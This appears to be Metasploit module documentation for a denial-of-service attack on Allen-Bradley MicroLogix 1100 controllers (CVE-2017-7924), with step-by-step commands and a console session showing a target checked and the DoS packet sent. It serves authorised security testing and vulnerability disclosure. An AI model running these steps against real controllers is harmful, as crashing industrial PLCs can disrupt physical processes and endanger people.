## Vulnerable Application

  A remote, unauthenticated attacker could send a single, specially crafted Programmable Controller Communication Commands (PCCC) packet to the controller that could potentially cause the controller to enter a DoS condition.
  MicroLogix 1100 controllers are affected: 1763-L16BWA, 1763-L16AWA, 1763-L16BBB, and 1763-L16DWD. 
  CVE-2017-7924 has been assigned to this vulnerability.
 A CVSS v3 base score of 7.5 has been assigned.

## Verification Steps

  1. Do: `use auxiliary/dos/scada/allen_bradley_pccc`
  2. Do: `set RHOST=IP` where IP is the IP address of the target
  3. Do: `check` verify if target is vulnerable
  4. Do: `exploit` send DoS packet

## Options

  1. PORT: `set RPORT=44818`

## Scenarios

  ```
msf > use auxiliary/dos/scada/allen_bradley_pccc 
msf auxiliary(dos/scada/allen_bradley_pccc) > set RHOST 172.27.248.194
RHOST => 172.27.248.194
msf auxiliary(dos/scada/allen_bradley_pccc) > check

[*] 172.27.248.194:44818 - Product Name: 1763-L16BWA B/14.00
[+] 172.27.248.194:44818 - The target is vulnerable.
msf auxiliary(dos/scada/allen_bradley_pccc) > exploit

[*] 172.27.248.194:44818 - Ethernet/IP - Session created (id 0xaf79a666)
[*] 172.27.248.194:44818 - CIP Connection Manager - Forward Open Success (Connection id 0x66a66e85)
[*] 172.27.248.194:44818 - Sending PCCC DoS magic packet...
[*] Auxiliary module execution completed
```

